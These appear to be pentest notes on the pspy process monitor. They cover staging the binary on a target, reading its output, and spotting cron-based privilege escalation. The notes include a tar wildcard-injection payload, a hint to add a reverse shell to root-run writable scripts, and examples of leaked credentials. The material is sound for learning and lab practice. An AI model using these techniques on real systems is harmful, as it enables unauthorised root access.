# pspy

**Tags:** `#pspy` `#privesc` `#linux` `#enumeration` `#cron` `#postexploit`

Unprivileged Linux process monitor. Watches for new processes without needing root — catches cron jobs, scripts, and commands run by other users (including root) as they execute. Essential for spotting cron-based privesc opportunities and credential leakage in process arguments.

**Source:** https://github.com/DominicBreuker/pspy
**Install:** Download precompiled binary from releases — no install on target needed

```bash
./pspy64
```

> [!note]
> Let pspy run for several minutes — cron jobs may only fire every minute or every 5 minutes. Watch for processes running as UID 0 (root) that involve scripts you can write to, or commands that contain credentials in their arguments.

---

## Setup

```bash
# Download correct arch binary from Kali
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64   # 64-bit
wget https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32   # 32-bit

# Serve to target
python3 -m http.server 8000

# On target
wget http://10.10.14.5:8000/pspy64 -O /tmp/pspy64
chmod +x /tmp/pspy64
```

---

## Usage

```bash
# Basic — watch processes
./pspy64

# With file system events (inotify — shows file reads/writes)
./pspy64 -f

# Filter by UID (0 = root processes only)
./pspy64 -u 0

# Slower scan interval (less CPU)
./pspy64 -i 5000      # 5000ms interval

# Quiet — no color
./pspy64 -c
```

---

## Reading Output

```
# Format: timestamp UID=<uid> PID=<pid> CMD=<command>
2024/01/01 00:01:00 CMD: UID=0    PID=1234   | /bin/bash /opt/backup.sh
2024/01/01 00:01:00 CMD: UID=1001 PID=1235   | python3 /home/user/app.py
```

**What to look for:**
- `UID=0` running scripts you can write to
- Credentials in command arguments (`--password`, `-p`, API keys)
- Scripts in world-writable directories being called by root
- Wildcard usage in commands (e.g., `tar * `, `chown *`)

---

## Exploitable Patterns

```bash
# Root runs a script you can modify
UID=0 ... /bin/bash /opt/scripts/backup.sh
# → Check: ls -la /opt/scripts/backup.sh — if writable, add reverse shell

# Root uses wildcard with tar (wildcard injection)
UID=0 ... tar czf /backup/archive.tgz /var/www/*
# → Create: --checkpoint=1 --checkpoint-action=exec=sh shell.sh

# Credentials in args
UID=0 ... mysql -u root -pPassword123 database
UID=0 ... curl -u admin:secret http://internal/

# Script calls another script in writable location
UID=0 ... /usr/local/bin/monitor.sh → calls /tmp/check.sh
```

---

## Cron Timing Reference

```bash
# Common cron intervals to watch for
* * * * *     → every minute
*/5 * * * *   → every 5 minutes
0 * * * *     → every hour

# Also check static cron files while pspy runs
cat /etc/crontab
ls /etc/cron.d/ /etc/cron.hourly/ /etc/cron.daily/
crontab -l     # current user's cron
```

---

*Created: 2026-03-13*
*Updated: 2026-03-13*
*Model: claude-sonnet-4-6*
